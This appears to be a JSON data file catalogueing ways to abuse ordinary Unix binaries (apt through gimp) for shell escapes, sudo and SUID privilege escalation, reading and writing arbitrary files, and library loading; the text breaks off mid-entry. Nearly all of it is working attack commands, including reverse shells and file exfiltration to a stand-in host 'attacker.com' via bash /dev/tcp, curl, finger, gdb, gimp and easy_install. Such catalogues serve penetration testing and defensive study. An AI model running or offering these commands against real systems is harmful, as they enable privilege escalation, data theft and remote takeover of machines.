{
  "apt": {
    "Shell": [
      "apt-get changelog apt\n!/bin/sh"
    ],
    "Sudo": [
      "sudo apt-get changelog apt\n!/bin/sh",
      "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl",
      "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh"
    ]
  },
  "aria2c": {
    "Command": [
      "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\naria2c --on-download-error=$TF http://x",
      "aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which aria2c) .; chmod +s ./aria2c'\n\nCOMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x"
    ],
    "Sudo": [
      "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x"
    ]
  },
  "arp": {
    "File read": [
      "LFILE=file_to_read\narp -v -f \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which arp) .; chmod +s ./arp'\n\nLFILE=file_to_read\n./arp -v -f \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo arp -v -f \"$LFILE\""
    ]
  },
  "ash": {
    "Shell": [
      "ash"
    ],
    "File write": [
      "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which ash) .; chmod +s ./ash'\n\n./ash"
    ],
    "Sudo": [
      "sudo ash"
    ]
  },
  "awk": {
    "Shell": [
      "awk 'BEGIN {system(\"/bin/sh\")}'"
    ],
    "Non-interactive reverse shell": [
      "RHOST=attacker.com\nRPORT=12345\nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
    ],
    "Non-interactive bind shell": [
      "LPORT=12345\nawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
    ],
    "File write": [
      "LFILE=file_to_write\nawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"
    ],
    "File read": [
      "LFILE=file_to_read\nawk '//' \"$LFILE\""
    ],
    "Sudo": [
      "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which awk) .; chmod +s ./awk'\n\n./awk 'BEGIN {system(\"/bin/sh\")}'"
    ]
  },
  "base32": {
    "File read": [
      "LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which base32) .; chmod +s ./base32'\n\nLFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode"
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode"
    ]
  },
  "base64": {
    "File read": [
      "LFILE=file_to_read\nbase64 \"$LFILE\" | base64 --decode"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which base64) .; chmod +s ./base64'\n\nLFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode"
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode"
    ]
  },
  "bash": {
    "Shell": [
      "bash"
    ],
    "Reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\nbash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'"
    ],
    "File upload": [
      "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(<$LFILE)\" > /dev/tcp/$RHOST/$RPORT'",
      "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'"
    ],
    "File download": [
      "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'",
      "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'"
    ],
    "File write": [
      "export LFILE=file_to_write\nbash -c 'echo DATA > $LFILE'",
      "LFILE=file_to_write\nHISTIGNORE='history *'\nhistory -c\nDATA\nhistory -w $LFILE"
    ],
    "File read": [
      "export LFILE=file_to_read\nbash -c 'echo \"$(<$LFILE)\"'",
      "LFILE=file_to_read\nHISTTIMEFORMAT=$'\\r\\e[K'\nhistory -r $LFILE\nhistory"
    ],
    "Library load": [
      "bash -c 'enable -f ./lib.so x'"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which bash) .; chmod +s ./bash'\n\n./bash -p"
    ],
    "Sudo": [
      "sudo bash"
    ]
  },
  "bpftrace": {
    "Sudo": [
      "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'",
      "TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF",
      "sudo bpftrace -c /bin/sh -e 'END {exit()}'"
    ]
  },
  "bundler": {
    "Shell": [
      "bundler help\n!/bin/sh",
      "export BUNDLE_GEMFILE=x\nbundler exec /bin/sh",
      "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler exec /bin/sh",
      "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler console\nsystem('/bin/sh -c /bin/sh')",
      "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/Gemfile\ncd $TF\nbundler install"
    ],
    "Sudo": [
      "sudo bundler help\n!/bin/sh"
    ]
  },
  "busctl": {
    "Shell": [
      "busctl --show-machine\n!/bin/sh"
    ],
    "Sudo": [
      "sudo busctl --show-machine\n!/bin/sh"
    ]
  },
  "busybox": {
    "Shell": [
      "busybox sh"
    ],
    "File upload": [
      "LPORT=12345\nbusybox httpd -f -p $LPORT -h ."
    ],
    "File write": [
      "LFILE=file_to_write\nbusybox sh -c 'echo \"DATA\" > $LFILE'"
    ],
    "File read": [
      "LFILE=file_to_read\n./busybox cat \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which busybox) .; chmod +s ./busybox'\n\n./busybox sh"
    ],
    "Sudo": [
      "sudo busybox sh"
    ]
  },
  "byebug": {
    "Shell": [
      "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nbyebug $TF\ncontinue"
    ],
    "Sudo": [
      "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which byebug) .; chmod +s ./byebug'\n\nTF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\n./byebug $TF\ncontinue"
    ]
  },
  "cancel": {
    "File upload": [
      "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\ncancel -u \"$(cat $LFILE)\" -h $RHOST:$RPORT"
    ]
  },
  "cat": {
    "File read": [
      "LFILE=file_to_read\ncat \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which cat) .; chmod +s ./cat'\n\nLFILE=file_to_read\n./cat \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo cat \"$LFILE\""
    ]
  },
  "chmod": {
    "SUID": [
      "sudo sh -c 'cp $(which chmod) .; chmod +s ./chmod'\n\nLFILE=file_to_change\n./chmod 0777 $LFILE"
    ],
    "Sudo": [
      "LFILE=file_to_change\nsudo chmod 0777 $LFILE"
    ]
  },
  "chown": {
    "SUID": [
      "sudo sh -c 'cp $(which chown) .; chmod +s ./chown'\n\nLFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE"
    ],
    "Sudo": [
      "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE"
    ]
  },
  "chroot": {
    "SUID": [
      "sudo sh -c 'cp $(which chroot) .; chmod +s ./chroot'\n\n./chroot / /bin/sh -p"
    ],
    "Sudo": [
      "sudo chroot /"
    ]
  },
  "cobc": {
    "Shell": [
      "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\ncobc -xFj --frelax-syntax-checks $TF/x"
    ],
    "Sudo": [
      "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x"
    ]
  },
  "cp": {
    "File write": [
      "LFILE=file_to_write\necho \"DATA\" | cp /dev/stdin \"$LFILE\""
    ],
    "File read": [
      "LFILE=file_to_read\ncp \"$LFILE\" /dev/stdout"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which cp) .; chmod +s ./cp'\n\nLFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\"",
      "sudo sh -c 'cp $(which cp) .; chmod +s ./cp'\n\nLFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./cp $TF $LFILE"
    ],
    "Sudo": [
      "LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"",
      "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE"
    ]
  },
  "cpan": {
    "Shell": [
      "cpan\n! exec '/bin/bash'"
    ],
    "Reverse shell": [
      "export RHOST=localhost\nexport RPORT=9000\ncpan\n! use Socket; my $i=\"$ENV{RHOST}\"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};"
    ],
    "File upload": [
      "cpan\n! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();"
    ],
    "File download": [
      "export URL=http://attacker.com/file_to_get\ncpan\n! use File::Fetch; my $file = (File::Fetch->new(uri => \"$ENV{URL}\"))->fetch();"
    ],
    "Sudo": [
      "sudo cpan\n! exec '/bin/bash'"
    ]
  },
  "cpulimit": {
    "Shell": [
      "cpulimit -l 100 -f /bin/sh"
    ],
    "Sudo": [
      "sudo cpulimit -l 100 -f /bin/sh"
    ]
  },
  "crash": {
    "Shell": [
      "crash -h\n!sh"
    ],
    "Command": [
      "COMMAND='/usr/bin/id'\nCRASHPAGER=\"$COMMAND\" crash -h"
    ],
    "Sudo": [
      "sudo crash -h\n!sh"
    ]
  },
  "crontab": {
    "Command": [
      "crontab -e"
    ],
    "Sudo": [
      "sudo crontab -e"
    ]
  },
  "csh": {
    "Shell": [
      "csh"
    ],
    "File write": [
      "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which csh) .; chmod +s ./csh'\n\n./csh -b"
    ],
    "Sudo": [
      "sudo csh"
    ]
  },
  "curl": {
    "File upload": [
      "URL=http://attacker.com/\nLFILE=file_to_send\ncurl -X POST -d @$file_to_send $URL"
    ],
    "File download": [
      "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\ncurl $URL -o $LFILE"
    ],
    "File read": [
      "LFILE=/tmp/file_to_read\ncurl file://$LFILE"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which curl) .; chmod +s ./curl'\n\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE"
    ],
    "Sudo": [
      "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE"
    ]
  },
  "cut": {
    "File read": [
      "LFILE=file_to_read\ncut -d \"\" -f1 \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which cut) .; chmod +s ./cut'\n\nLFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\""
    ]
  },
  "dash": {
    "Shell": [
      "dash"
    ],
    "File write": [
      "export LFILE=file_to_write\ndash -c 'echo DATA > $LFILE'"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which dash) .; chmod +s ./dash'\n\n./dash -p"
    ],
    "Sudo": [
      "sudo dash"
    ]
  },
  "date": {
    "File read": [
      "LFILE=file_to_read\ndate -f $LFILE"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which date) .; chmod +s ./date'\n\nLFILE=file_to_read\n./date -f $LFILE"
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo date -f $LFILE"
    ]
  },
  "dd": {
    "File write": [
      "LFILE=file_to_write\necho \"DATA\" | dd of=$LFILE"
    ],
    "File read": [
      "LFILE=file_to_read\ndd if=$LFILE"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which dd) .; chmod +s ./dd'\n\nLFILE=file_to_write\necho \"data\" | ./dd of=$LFILE"
    ],
    "Sudo": [
      "LFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE"
    ]
  },
  "dialog": {
    "File read": [
      "LFILE=file_to_read\ndialog --textbox \"$LFILE\" 0 0"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which dialog) .; chmod +s ./dialog'\n\nLFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0"
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0"
    ]
  },
  "diff": {
    "File read": [
      "LFILE=file_to_read\ndiff --line-format=%L /dev/null $LFILE"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which diff) .; chmod +s ./diff'\n\nLFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE"
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE"
    ]
  },
  "dmesg": {
    "Shell": [
      "dmesg -H\n!/bin/sh"
    ],
    "File read": [
      "LFILE=file_to_read\ndmesg -rF \"$LFILE\""
    ],
    "Sudo": [
      "sudo dmesg -H\n!/bin/sh"
    ]
  },
  "dmsetup": {
    "SUID": [
      "sudo sh -c 'cp $(which dmsetup) .; chmod +s ./dmsetup'\n\n./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'"
    ],
    "Sudo": [
      "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'"
    ]
  },
  "dnf": {
    "Sudo": [
      "TF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n",
      "sudo dnf install -y x-1.0-1.noarch.rpm"
    ]
  },
  "docker": {
    "Shell": [
      "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    ],
    "File write": [
      "CONTAINER_ID=\"$(docker run -d alpine)\" # or existing\nTF=$(mktemp)\necho \"DATA\" > $TF\ndocker cp $TF $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF file_to_write"
    ],
    "File read": [
      "CONTAINER_ID=\"$(docker run -d alpine)\"  # or existing\nTF=$(mktemp)\ndocker cp file_to_read $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF $TF\ncat $TF"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which docker) .; chmod +s ./docker'\n\n./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    ],
    "Sudo": [
      "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    ]
  },
  "dpkg": {
    "Shell": [
      "dpkg -l\n!/bin/sh"
    ],
    "Sudo": [
      "sudo dpkg -l\n!/bin/sh",
      "TF=$(mktemp -d)\necho 'exec /bin/sh' > $TF/x.sh\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n",
      "sudo dpkg -i x_1.0_all.deb"
    ]
  },
  "easy_install": {
    "Shell": [
      "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\neasy_install $TF"
    ],
    "Reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\neasy_install $TF"
    ],
    "File upload": [
      "export URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py\neasy_install $TF",
      "export LPORT=8888\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py\neasy_install $TF"
    ],
    "File download": [
      "export URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', '$(whereis python)', '-c', \\\"\\\"\\\"import sys;\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve('$URL', '$LFILE')\\\"\\\"\\\")\" > $TF/setup.py\npip install $TF"
    ],
    "File write": [
      "export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', 'python', '-c', 'open(\\\"$LFILE\\\",\\\"w+\\\").write(\\\"DATA\\\")')\" > $TF/setup.py\neasy_install $TF"
    ],
    "File read": [
      "TF=$(mktemp -d)\necho 'print(open(\"file_to_read\").read())' > $TF/setup.py\neasy_install $TF"
    ],
    "Library load": [
      "TF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\neasy_install $TF"
    ],
    "Sudo": [
      "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF"
    ]
  },
  "eb": {
    "Shell": [
      "eb logs\n!/bin/sh"
    ],
    "Sudo": [
      "sudo eb logs\n!/bin/sh"
    ]
  },
  "ed": {
    "Shell": [
      "ed\n!/bin/sh"
    ],
    "File write": [
      "ed file_to_write\na\nDATA\n.\nw\nq"
    ],
    "File read": [
      "ed file_to_read\n,p\nq"
    ],
    "Sudo": [
      "sudo ed\n!/bin/sh"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which ed) .; chmod +s ./ed'\n\n./ed\n!/bin/sh"
    ]
  },
  "emacs": {
    "Shell": [
      "emacs -Q -nw --eval '(term \"/bin/sh\")'"
    ],
    "File write": [
      "emacs file_to_write\nDATA\nC-x C-s"
    ],
    "File read": [
      "emacs file_to_read"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which emacs) .; chmod +s ./emacs'\n\n./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"
    ],
    "Sudo": [
      "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"
    ]
  },
  "env": {
    "Shell": [
      "env /bin/sh"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which env) .; chmod +s ./env'\n\n./env /bin/sh -p"
    ],
    "Sudo": [
      "sudo env /bin/sh"
    ]
  },
  "eqn": {
    "File read": [
      "LFILE=file_to_read\neqn \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which eqn) .; chmod +s ./eqn'\n\nLFILE=file_to_read\n./eqn \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo eqn \"$LFILE\""
    ]
  },
  "expand": {
    "File read": [
      "LFILE=file_to_read\nexpand \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which expand) .; chmod +s ./expand'\n\nLFILE=file_to_read\n./expand \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo expand \"$LFILE\""
    ]
  },
  "expect": {
    "Shell": [
      "expect -c 'spawn /bin/sh;interact'"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which expect) .; chmod +s ./expect'\n\n./expect -c 'spawn /bin/sh -p;interact'"
    ],
    "Sudo": [
      "sudo expect -c 'spawn /bin/sh;interact'"
    ]
  },
  "facter": {
    "Shell": [
      "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nFACTERLIB=$TF facter"
    ],
    "Sudo": [
      "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter"
    ]
  },
  "file": {
    "File read": [
      "LFILE=file_to_read\nfile -f $LFILE",
      "LFILE=file_to_read\nfile -m $LFILE"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which file) .; chmod +s ./file'\n\nLFILE=file_to_read\n./file -f $LFILE"
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo file -f $LFILE"
    ]
  },
  "find": {
    "Shell": [
      "find . -exec /bin/sh \\; -quit"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which find) .; chmod +s ./find'\n\n./find . -exec /bin/sh -p \\; -quit"
    ],
    "Sudo": [
      "sudo find . -exec /bin/sh \\; -quit"
    ]
  },
  "finger": {
    "File upload": [
      "RHOST=attacker.com\nLFILE=file_to_send\nfinger \"$(base64 $LFILE)@$RHOST\""
    ],
    "File download": [
      "RHOST=attacker.com\nLFILE=file_to_save\nfinger x@$RHOST | base64 -d > \"$LFILE\""
    ]
  },
  "flock": {
    "Shell": [
      "flock -u / /bin/sh"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which flock) .; chmod +s ./flock'\n\n./flock -u / /bin/sh -p"
    ],
    "Sudo": [
      "sudo flock -u / /bin/sh"
    ]
  },
  "fmt": {
    "File read": [
      "LFILE=file_to_read\nfmt -pNON_EXISTING_PREFIX \"$LFILE\"",
      "LFILE=file_to_read\nfmt -999 \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which fmt) .; chmod +s ./fmt'\n\nLFILE=file_to_read\n./fmt -999 \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo fmt -999 \"$LFILE\""
    ]
  },
  "fold": {
    "File read": [
      "LFILE=file_to_read\nfold -w99999999 \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which fold) .; chmod +s ./fold'\n\nLFILE=file_to_read\n./fold -w99999999 \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\""
    ]
  },
  "ftp": {
    "Shell": [
      "ftp\n!/bin/sh"
    ],
    "File upload": [
      "RHOST=attacker.com\nftp $RHOST\nput file_to_send"
    ],
    "File download": [
      "RHOST=attacker.com\nftp $RHOST\nget file_to_get"
    ],
    "Sudo": [
      "sudo ftp\n!/bin/sh"
    ]
  },
  "gawk": {
    "Shell": [
      "gawk 'BEGIN {system(\"/bin/sh\")}'"
    ],
    "Non-interactive reverse shell": [
      "RHOST=attacker.com\nRPORT=12345\ngawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
    ],
    "Non-interactive bind shell": [
      "LPORT=12345\ngawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
    ],
    "File write": [
      "LFILE=file_to_write\ngawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"
    ],
    "File read": [
      "LFILE=file_to_read\ngawk '//' \"$LFILE\""
    ],
    "Sudo": [
      "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which gawk) .; chmod +s ./gawk'\n\n./gawk 'BEGIN {system(\"/bin/sh\")}'"
    ]
  },
  "gcc": {
    "Shell": [
      "gcc -wrapper /bin/sh,-s ."
    ],
    "Sudo": [
      "sudo gcc -wrapper /bin/sh,-s ."
    ]
  },
  "gdb": {
    "Shell": [
      "gdb -nx -ex '!sh' -ex quit"
    ],
    "Reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\ngdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' -ex quit"
    ],
    "File upload": [
      "export URL=http://attacker.com/\nexport LFILE=file_to_send\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' -ex quit",
      "export LPORT=8888\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit"
    ],
    "File download": [
      "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])' -ex quit"
    ],
    "File write": [
      "LFILE=file_to_write\ngdb -nx -ex \"dump value $LFILE \\\"DATA\\\"\" -ex quit"
    ],
    "File read": [
      "gdb -nx -ex 'python print(open(\"file_to_read\").read())' -ex quit"
    ],
    "Library load": [
      "gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' -ex quit"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which gdb) .; chmod +s ./gdb'\n\n./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"
    ],
    "Sudo": [
      "sudo gdb -nx -ex '!sh' -ex quit"
    ],
    "Capabilities": [
      "cp $(which gdb) .\nsudo setcap cap_setuid+ep gdb\n\n./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"
    ]
  },
  "gem": {
    "Shell": [
      "gem open -e \"/bin/sh -c /bin/sh\" rdoc",
      "gem open rdoc\n:!/bin/sh",
      "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem build $TF/x",
      "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem install --file $TF/x"
    ],
    "Sudo": [
      "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"
    ]
  },
  "genisoimage": {
    "File read": [
      "LFILE=file_to_read\ngenisoimage -q -o - \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\""
    ]
  },
  "gimp": {
    "Shell": [
      "gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
    ],
    "Reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'"
    ],
    "File upload": [
      "export URL=http://attacker.com/\nexport LFILE=file_to_send\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'",
      "export LPORT=8888\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'"
    ],
    "File download": [
      "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'"
    ],
    "File write": [
      "gimp -idf --batch-interpreter=python-fu-eval -b 'open(\"file_to_write\", \"wb\").write(\"DATA\")'"
    ],
    "File read": [
      "gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(\"file_to_read\").read())'"
    ],
    "Library load": [
